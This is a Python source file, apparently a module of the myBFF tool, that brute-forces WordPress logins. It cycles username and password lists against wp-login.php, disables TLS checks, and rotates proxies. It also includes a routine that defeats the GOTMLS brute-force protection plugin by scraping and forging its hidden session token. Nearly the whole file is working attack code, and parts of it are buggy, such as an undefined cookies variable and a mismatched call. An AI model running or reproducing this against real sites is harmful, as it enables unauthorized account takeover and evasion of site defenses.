#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
import time
import sys
import random

class wordpressBrute(webModule):
    def __init__(self, config, display, lock):
        super(wordpressBrute, self).__init__(config, display, lock)
        self.fingerprint="wp-content"
        self.response="Success"
    def somethingCool(self, config, c):
        print("We will do something cool....eventually!")
    def GOTMLSbypass(self, config, payload):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            cget = c.get(config["HOST"] + '/wp-login.php', allow_redirects=True)
            #print cget.text
            o = re.findall('<input type="hidden" name="(.*?)" value="(.*?)">', cget.text, re.DOTALL)
                #print o
            for n in o:
                if "session_id" in n:
                    sessID = n[1]
            etime = str(time.time()).split(".", 1)[0]
            cookie1 = cget.cookies['PHPSESSID']
            cookies = dict(PHPSESSID=cookie1)
            cookies["wordpress_test_cookie"] = "WP+Cookie+check"
            c.cookies.clear()
        if config["UserFile"]:
                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                for line in lines:
                    config["USERNAME"] = line.strip('\n')
                    payload = {
                        'log': config["USERNAME"],
                        'pwd': config["PASSWORD"],
                        'session_id': sessID,
                        'sess' + sessID: etime + '122',
                        'wp-submit': 'Log+In',
                        'testcookie': '1'
                        }
                    self.connectTest(config, payload)
        else:
            payload = {
                'log': config["USERNAME"],
                'pwd': config["PASSWORD"],
                'session_id': sessID,
                'sess' + sessID: etime + '122',
                'wp-submit': 'Log+In',
                'testcookie': '1'
                }
            self.connectTest(config, payload)

    def connectTest(self, config, payload):
        with session() as c:
            proxy = random.choice(config["proxies"])
            requests.packages.urllib3.disable_warnings()
            cpost = c.post(config["HOST"] + '/wp-login.php', data=payload, allow_redirects=True, verify=False)#, proxies=proxy)
            if "brute-force attacks" in cpost.text:
                print "[!]  This site is protected by GOTMLS.NET Brute-Force Module. That is OK. I can bypass this protection..."
                self.GOTMLSbypass(config, payload)
            else:
                check = re.search("ERROR", cpost.text)
                if check:
                    print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
                else:
                    print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                    if not config["dry_run"]:
                        print("[!] Time to do something cool!")
                        self.somethingCool(config, c, cookies)
    def payload(self, config):
        if config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
            for pass_line in pass_lines:
                if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        config["PASSWORD"] = pass_line.strip('\n')
                        payload = {
                            'log': config["USERNAME"],
                            'pwd': config["PASSWORD"],
                            'wp-submit': 'Log+In',
                            'testcookie': '1'
                            }
                        self.connectTest(config, payload)
                        time.sleep(config["timeout"])
                else:
                    config["PASSWORD"] = pass_line.strip('\n')
                    payload = {
                        'log': config["USERNAME"],
                        'pwd': config["PASSWORD"],
                        'wp-submit': 'Log+In',
                        'testcookie': '1'
                        }
                    self.connectTest(config, payload)
                    time.sleep(config["timeout"])
        elif config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'log': config["USERNAME"],
                    'pwd': config["PASSWORD"],
                    'wp-submit': 'Log+In',
                    'testcookie': '1'
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'log': config["USERNAME"],
                'pwd': config["PASSWORD"],
                'wp-submit': 'Log+In',
                'testcookie': '1'
                }
            self.connectTest(config, payload)
